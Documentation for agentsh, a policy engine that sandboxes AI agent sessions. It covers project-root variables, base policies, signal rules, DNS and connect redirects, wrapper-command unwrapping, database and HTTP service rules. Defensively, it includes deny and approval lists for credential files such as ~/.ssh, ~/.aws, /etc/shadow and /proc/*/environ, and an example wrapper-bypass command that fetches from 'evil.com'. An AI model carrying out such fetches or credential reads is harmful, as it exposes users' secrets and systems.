# Policies

This guide covers policy configuration and management for agentsh.

## Policy Variables

Policies support variable substitution using `${VAR}` syntax. Variables are expanded at session creation time, allowing policies to be portable across different projects and environments.

### Built-in Variables

| Variable | Description | Example Value |
|----------|-------------|---------------|
| `${PROJECT_ROOT}` | Auto-detected project root (nearest go.mod, package.json, Cargo.toml, etc.) | `/home/user/myproject` |
| `${GIT_ROOT}` | Nearest .git directory (may differ from PROJECT_ROOT in monorepos) | `/home/user/monorepo` |
| `${HOME}` | User's home directory (from environment) | `/home/user` |
| `${TMPDIR}` | System temp directory (from environment) | `/tmp` |

### How Project Root Detection Works

When a session is created, agentsh walks up from the workspace directory looking for project markers. The detection follows this logic:

1. **Language markers** (go.mod, package.json, Cargo.toml, pyproject.toml) set `PROJECT_ROOT`
2. **.git directory** sets `GIT_ROOT` (and `PROJECT_ROOT` if no language marker found)
3. If no markers found, `PROJECT_ROOT` defaults to the workspace directory

**Monorepo example:**
```
/home/user/monorepo/           <- GIT_ROOT (.git here)
  ├── services/
  │   └── api/                 <- PROJECT_ROOT (go.mod here)
  │       └── cmd/             <- workspace (session started here)
  └── frontend/
      └── package.json
```

The default project markers are:
- `.git`
- `go.mod`
- `package.json`
- `Cargo.toml`
- `pyproject.toml`

### Fallback Syntax

Use `${VAR:-fallback}` to provide a default value when a variable is undefined:

```yaml
paths:
  # Use git root if available, otherwise project root
  - "${GIT_ROOT:-${PROJECT_ROOT}}/**"

  # Use TMPDIR from environment, fall back to /tmp
  - "${TMPDIR:-/tmp}/**"

  # Empty fallback (variable becomes empty string if undefined)
  - "${OPTIONAL_PATH:-}/**"
```

### Example: Using Variables in Policies

```yaml
file_rules:
  # Allow full access to project files
  - name: allow-project
    paths:
      - "${PROJECT_ROOT}/**"
    operations: ["*"]
    decision: allow

  # Read-only access to monorepo root (for shared configs)
  - name: allow-monorepo-read
    paths:
      - "${GIT_ROOT}/**"
    operations: [read, stat, list]
    decision: allow

  # Block access to credentials
  - name: deny-credentials
    paths:
      - "${HOME}/.ssh/**"
      - "${HOME}/.aws/**"
    operations: ["*"]
    decision: deny
```

## Server Configuration

### Project Root Detection Settings

In your server configuration (`server-config.yaml`):

```yaml
policies:
  dir: "/etc/agentsh/policies"
  default: "dev-safe"

  # Enable/disable automatic project root detection (default: true)
  detect_project_root: true

  # Custom project markers (optional, overrides defaults)
  project_markers:
    - ".git"
    - "go.mod"
    - "package.json"
    - "Cargo.toml"
    - "pyproject.toml"
    - "setup.py"           # Add Python setup.py
    - "pom.xml"            # Add Maven projects
    - ".agentsh-root"      # Custom marker file
```

### Disabling Detection

**Server-wide** (in config):
```yaml
policies:
  detect_project_root: false
```

**Per-session** (CLI):
```bash
# Disable detection, use workspace as PROJECT_ROOT
agentsh exec --no-detect-root SESSION -- cmd

# Explicit project root (skips detection)
agentsh exec --project-root /path/to/project SESSION -- cmd
```

**Per-session** (API):
```json
{
  "workspace": "/home/user/project/subdir",
  "detect_project_root": false,
  "project_root": "/home/user/project"
}
```

## Project Overlay Insertion Boundaries

Policy rules use first-match ordering. A trusted base policy can mark the first
fallback rule in an ordered rule family with `project_overlay_boundary: true`:

```yaml
file_rules:
  - name: approve-sensitive-credentials
    paths: ["${HOME}/.credentials/**"]
    operations: ["*"]
    decision: approve

  - name: approve-outside-workspace-writes
    project_overlay_boundary: true
    paths: ["**"]
    operations: [write, create, delete, rename]
    decision: approve
```

Validated project-local file rules are inserted immediately before the marked
rule. Base rules above the boundary remain authoritative, while project rules
can take precedence over generic fallback approvals and defaults at and below
the boundary.

The marker is supported on top-level file, command, network, Unix-socket, and
signal rules. A base policy may have at most one marker in each rule family.
Project overlay files cannot set the marker. If a base policy has no explicit
marker, AgentSH retains the compatibility behavior of inserting project rules
before a recognized terminal catch-all deny, or appending them when no terminal
deny is represented as a rule.

## Extending a Base Policy

Use `extends` to start from one or more base policies. It takes a name or a
list of names. AgentSH looks the bases up in the same directory as the policy,
and a base can extend another policy.

```yaml
# /etc/agentsh/policies/team.yaml
version: 1
name: team
extends: org-base        # or: extends: [org-base, network-base]

command_rules:
  - name: allow-make
    commands: [make]
    decision: allow
```

In each rule list, the base rules come first and the policy's own rules
follow. With several bases, they go in the order listed. A base that shows up
twice in the chain is only included once.

The first matching rule wins, so a policy can't override its base. If the base
denies `rm`, an `allow` for `rm` in the policy has no effect. Reusing a rule
name from the base is an error. For the same reason, a base meant to be
extended should leave out catch-all denies like `default-deny-*` or
`paths: ["**"]`, because rules after them would not be reached. Put those
in the policy you select.

Other sections:

- `resource_limits`, `env_policy`, `direnv`, `audit`, `mcp_rules`,
  `transparent_commands`, `db_services`, `database_rules`,
  `database_connection_rules` and `policies` are taken from the policy if it
  sets them, and from the base otherwise. If two bases set one, the later base
  is used.
- `env_inject`, `providers`, `process_contexts` and `process_identities` are
  merged. Setting the same key twice is an error.
- `version`, `name` and `description` come from the policy itself.

Each base is checked like the selected policy, so with signing or
`policies.manifest_path` turned on, every base needs its own signature and
manifest entry. Loops, chains longer than 8 and missing bases are errors.
`extends` only works for policies loaded from a policy directory, so a pinned
host egress policy snapshot has to be a single file.

Project overlay rules go after the base rules. A `project_overlay_boundary`
or terminal deny in a base only counts when that base is selected directly.
In a policy that extends it, overlay rules go before the policy's own boundary
or terminal deny, or at the end.

## Recommended Base Policy

`configs/policies/base.yaml` is a base policy for other policies to extend.
It only has approve rules. It asks for approval before:

- access to credentials: SSH private keys, cloud CLI, Kubernetes, registry,
  password-manager and publishing credentials, `.netrc`, GnuPG secret keys,
  `/etc/shadow` and `/etc/gshadow`, and `/proc/*/environ`, `/proc/*/mem`
  and `/proc/kcore`;
- writes to persistence paths: shell profiles, `.envrc` files and direnv's
  allow list, git hooks, the global git config and the opened project's
  `.git/config`, `~/.ssh` access files, systemd user units, autostart
  entries, cron and at;
- connections to cloud metadata endpoints (AWS, GCP, Azure, Alibaba and
  others);
- privilege escalation (`sudo`, `su`, `doas`, `pkexec`, `run0`, `nsenter`,
  `chroot` and similar), `systemd-run`, `crontab`, `at`, mutating
  `systemctl` verbs, `loginctl enable-linger`, `direnv allow`, and
  connections to the systemd manager's private sockets.

Its rules are named `base-*` and are checked first. An extending policy
can't change them, so a deny in the base could never be relaxed. Approve
keeps the user in the loop instead. It also means an extending policy can't
turn these approvals into allows or denies.

Approvals only prompt when `approvals.enabled` is set in the server config.
With approvals off, approve rules allow the operation and log it. With
approvals on, a request nobody answers is denied after `approvals.timeout`
(5m by default). Unix socket checks can't wait for an answer, so the systemd socket rule refuses
the connection when approvals are on.

It has no allow rules, so on its own it denies everything except file
reads. Extend it instead:

```yaml
version: 1
name: team
extends: base
```

Don't copy its rules into your policy. These shipped policies extend it:
`default`, `dev-safe`, `agent-default`, `agent-sandbox` and `agent-strict`.
`ci-strict` and `bench-realistic` don't, because they run without anyone to
answer approvals. The project `.git/config` rule also covers `git config`,
`git remote add` and `git push -u` inside the opened project.

`base.yaml` has to be in the same directory as the policies that extend it.
The package installs it as `share/agentsh/configs/policies/base.yaml`. The
flake exposes it for Nix consumers:

- `agentsh.lib.policies.base`: the source file;
- `agentsh.packages.<system>.default.policies.base`: the installed file.

The NixOS module adds `base.yaml` to `/etc/agentsh/policies` next to
`services.agentsh.policies.source`, unless that directory has its own `base`
policy. Set `services.agentsh.policies.base = null` to turn this off, or to
another file to use a different base.

## Signal Rules

Signal rules control how signals (kill, terminate, stop, etc.) can be sent between processes within an agentsh session. This provides protection against runaway processes, accidental signal delivery to critical services, and enables graceful shutdown patterns.

Signals are blocked, redirected, and audited through seccomp user-notify.

### Signal Specification

Signals can be specified in three ways:

| Format | Example | Description |
|--------|---------|-------------|
| Name | `SIGKILL`, `SIGTERM`, `SIGHUP` | Standard signal name |
| Number | `9`, `15`, `1` | Numeric signal value |
| Group | `@fatal`, `@job`, `@reload` | Predefined signal group |

#### Predefined Signal Groups

| Group | Signals |
|-------|---------|
| `@fatal` | SIGKILL, SIGTERM, SIGQUIT, SIGABRT |
| `@job` | SIGSTOP, SIGCONT, SIGTSTP, SIGTTIN, SIGTTOU |
| `@reload` | SIGHUP, SIGUSR1, SIGUSR2 |
| `@ignore` | SIGCHLD, SIGURG, SIGWINCH |
| `@all` | All signals (1-31) |

### Target Types

Target types define which processes can receive signals:

| Type | Description |
|------|-------------|
| `self` | Process sending to itself |
| `children` | Direct children of sender |
| `descendants` | All descendants |
| `siblings` | Processes with same parent |
| `session` | Any process in agentsh session |
| `parent` | The agentsh supervisor |
| `external` | PIDs outside session |
| `system` | PID 1 and kernel threads |
| `user` | Other processes owned by same user |
| `process` | Match by process name pattern |
| `pid_range` | Match by PID range |

### Decision Types

| Decision | Behavior |
|----------|----------|
| `allow` | Allow signal |
| `deny` | Block signal (EPERM) |
| `audit` | Allow + log |
| `approve` | Require manual approval |
| `redirect` | Change signal (e.g., SIGKILL to SIGTERM) |
| `absorb` | Silently drop (no error to sender) |

### Example Configuration

```yaml
signal_rules:
  - name: allow-self-and-children
    signals: ["@all"]
    target:
      type: self
    decision: allow

  - name: graceful-kill
    signals: ["SIGKILL"]
    target:
      type: children
    decision: redirect
    redirect_to: SIGTERM

  - name: deny-external-fatal
    signals: ["@fatal"]
    target:
      type: external
    decision: deny
    fallback: audit
    message: "Blocking signal to external process"

  - name: protect-database
    signals: ["@fatal"]
    target:
      type: process
      pattern: "postgres*"
    decision: deny
```

## Network Redirect Rules

Network redirect rules transparently reroute DNS queries and TCP connections, enabling use cases like routing LLM API calls through corporate proxies or switching AI providers without code changes.

### DNS Redirect

Intercept DNS resolution for specific hostnames and return configured IP addresses:

```yaml
dns_redirect:
  - match: "api.anthropic.com"       # Exact match
    redirect_ip: "10.0.0.50"
    visibility: audit_only
    on_failure: fail_closed

  - match: ".*\\.openai\\.com"       # Regex pattern
    redirect_ip: "10.0.0.51"
    visibility: warn
```

| Field | Description |
|-------|-------------|
| `match` | Hostname pattern (exact string or regex) |
| `redirect_ip` | IP address to return instead |
| `visibility` | `silent`, `audit_only`, or `warn` |
| `on_failure` | `fail_closed`, `fail_open`, or `retry_original` |

### Connect Redirect

Redirect TCP connections to different destinations with optional TLS handling:

```yaml
connect_redirect:
  - match: "api.anthropic.com:443"
    redirect_to: "vertex-proxy.internal:8443"
    tls_mode: passthrough
    visibility: silent

  - match: "api.openai.com:443"
    redirect_to: "azure-proxy.internal:443"
    tls_mode: rewrite_sni
    rewrite_sni: "azure-openai.example.com"
    visibility: audit_only
```

| Field | Description |
|-------|-------------|
| `match` | `hostname:port` pattern (exact or regex) |
| `redirect_to` | `host:port` destination |
| `tls_mode` | `passthrough` (default) or `rewrite_sni` |
| `rewrite_sni` | SNI value for TLS ClientHello (when `tls_mode: rewrite_sni`) |
| `visibility` | `silent`, `audit_only`, or `warn` |

### How It Works

1. **DNS Redirect**: When a process resolves a hostname matching a rule, agentsh intercepts the DNS response and returns the configured IP. A correlation map stores the hostname→IP mapping.

2. **Connect Redirect**: When a process connects to an IP:port, agentsh checks the correlation map to find the original hostname, evaluates redirect rules, and transparently redirects the connection.

3. **TLS Handling**: In `passthrough` mode, encrypted traffic flows unchanged. In `rewrite_sni` mode, agentsh modifies the SNI in the TLS ClientHello before forwarding.

### Visibility Options

| Value | Behavior |
|-------|----------|
| `silent` | Redirect without logging or user notification |
| `audit_only` | Log the redirect but don't notify user |
| `warn` | Log and display a warning to user |

### Failure Handling Options

| Value | Behavior |
|-------|----------|
| `fail_closed` | If redirect fails, block the connection |
| `fail_open` | If redirect fails, allow original connection |
| `retry_original` | Try redirect, fall back to original on failure |

### Example Use Cases

**Route LLM APIs through corporate gateway:**
```yaml
dns_redirect:
  - match: "api.anthropic.com"
    redirect_ip: "10.1.1.100"
    visibility: audit_only

connect_redirect:
  - match: "api.anthropic.com:443"
    redirect_to: "llm-gateway.corp.local:443"
    tls_mode: passthrough
```

**Switch from OpenAI to Azure OpenAI:**
```yaml
connect_redirect:
  - match: "api.openai.com:443"
    redirect_to: "mycompany.openai.azure.com:443"
    tls_mode: rewrite_sni
    rewrite_sni: "mycompany.openai.azure.com"
```

## Transparent Commands

Transparent commands are wrapper/interpreter commands (like `env`, `sudo`, `nice`) that don't perform meaningful work themselves — they just launch another command. When execve interception is enabled, agentsh automatically "unwraps" these wrappers to find and evaluate the real payload command against policy.

### How It Works

1. A process calls `execve("/usr/bin/env", ["env", "wget", "http://evil.com"])`
2. agentsh recognizes `env` as a transparent command
3. It unwraps to find the payload: `wget`
4. Both `env` (wrapper) and `wget` (payload) are evaluated against command rules
5. The **most restrictive** decision wins — if either is denied, the execution is denied

This prevents bypass attacks where a blocked command is launched through an allowed wrapper.

### Built-in Transparent Commands

| Platform | Commands |
|----------|----------|
| All | `env`, `nice`, `nohup`, `sudo`, `time`, `xargs` |
| Linux | `busybox`, `doas`, `strace`, `ltrace`, `ld-linux*` |

### Policy Configuration

You can add or remove transparent commands via the `transparent_commands` policy field:

```yaml
# Add custom wrappers or remove built-in ones
transparent_commands:
  add:
    - myrunner        # Custom launcher that wraps commands
    - taskrunner      # CI task runner
  remove:
    - sudo            # Don't unwrap sudo (treat as opaque command)
```

### Unwrap Behavior

- **Depth limit:** Chained wrappers are unwrapped up to 5 levels deep (e.g., `sudo nice env wget`)
- **Flag skipping:** Flags (`-x`, `--flag=value`) and environment assignments (`FOO=bar`) are skipped to find the payload
- **Double-dash:** `--` ends flag parsing; the next argument is always the payload
- **Fail-safe:** If the heuristic identifies the wrong argument as the payload, it will not match any command rule and hit default-deny — the safe outcome

### Audit Events

When transparent unwrapping occurs, audit events include additional fields:

| Field | Description |
|-------|-------------|
| `unwrapped_from` | The original wrapper command (e.g., `/usr/bin/env`) |
| `payload_command` | The unwrapped payload (e.g., `wget`) |
| `raw_filename` | Original path before symlink canonicalization |

These fields help detect bypass attempts in audit logs.

## Database Policies

### Require WHERE For Sensitive Mutations

Use `require_where: true` on narrow mutation rules when accidental full-table updates or deletes are the main risk:

```yaml
database_rules:
  - name: allow-scoped-user-mutations
    db_service: appdb
    operations: [modify, delete]
    relations: ["public.users"]
    match_object_resolution: catalog_resolved
    require_where: true
    decision: allow
```

This rule allows `UPDATE public.users SET disabled = true WHERE id = 123` when the relation selector matches, but it does not cover `UPDATE public.users SET disabled = true`. The guard checks only that a top-level `WHERE` exists; it does not prove the predicate is selective or tenant-safe. It is also only a rule matcher: if another unguarded `allow`, `audit`, or `approve` rule covers the same `modify` or `delete` effect, a no-WHERE mutation can still be permitted.

## HTTP Services

`http_services:` declares named HTTP upstreams that child processes can reach through the proxy gateway. Declaring a service also blocks direct HTTP/HTTPS connections to its upstream host (and any aliases) from the child process — traffic must flow through the gateway where the declared rules are enforced.

### Complete policy example

```yaml
version: 1
name: agent-with-github

# Allow agents to use tools
command_rules:
  - name: allow-git
    commands: [git]
    decision: allow

# Declare one HTTP service: GitHub API read access, approve on writes
http_services:
  - name: github
    upstream: https://api.github.com
    expose_as: GITHUB_API_URL
    aliases: [api.github.com]
    allow_direct: false    # default; blocks direct calls to api.github.com
    default: deny

    rules:
      - name: read-issues
        methods: [GET]
        paths:
          - /repos/*/*/issues
          - /repos/*/*/issues/*
        decision: allow
        message: "reading issues is allowed"

      - name: create-issue-needs-approval
        methods: [POST]
        paths:
          - /repos/*/*/issues
        decision: approve
        message: "Agent wants to create an issue: approve?"
        timeout: 5m
```

Child processes receive `GITHUB_API_URL=http://127.0.0.1:PORT/svc/github/` in their environment. Code that calls the GitHub API should use that variable as its base URL.

### Fail-closed host guard

When `allow_direct: false` is set (the default), any direct outbound connection to the upstream host or its aliases is blocked at the network layer and logged as an `http_service_denied_direct` event. The agent can only reach the service through the `/svc/<name>/` gateway.

Set `allow_direct: true` only as an escape hatch when a third-party SDK cannot be configured to use a custom base URL.

### Approval gating

Rules with `decision: approve` use the same approvals manager as other approve rules in agentsh. The target shown to the approver is the request path including the query string. See [`docs/approval-auth.md`](../approval-auth.md) for approval channel configuration and anti-self-approval protections.

### Rule evaluation order

Rules are evaluated in declaration order. The first rule whose `methods` and `paths` both match wins. If no rule matches, the service's `default` applies (`deny` when not set). `paths` are compiled as glob patterns with `/` as the separator — `*` matches within a single path segment, not across segments; use `**` for multi-segment matches.

## Troubleshooting

### Variable Not Expanding

If a variable like `${PROJECT_ROOT}` appears literally in logs:

1. Check that the policy file uses the correct syntax (`${VAR}`, not `$VAR`)
2. Verify the variable is defined (check session creation logs)
3. For undefined variables without fallbacks, session creation will fail with an error

### Wrong Project Root Detected

If the wrong directory is detected as PROJECT_ROOT:

1. Check which marker files exist in parent directories
2. Use `--project-root` to override detection
3. Add a custom marker file (e.g., `.agentsh-root`) and configure `project_markers`

### Checking Detected Values

The detected PROJECT_ROOT and GIT_ROOT are included in session information:

```bash
# Via API
curl http://localhost:18080/api/v1/sessions/SESSION_ID | jq '.project_root, .git_root'
```
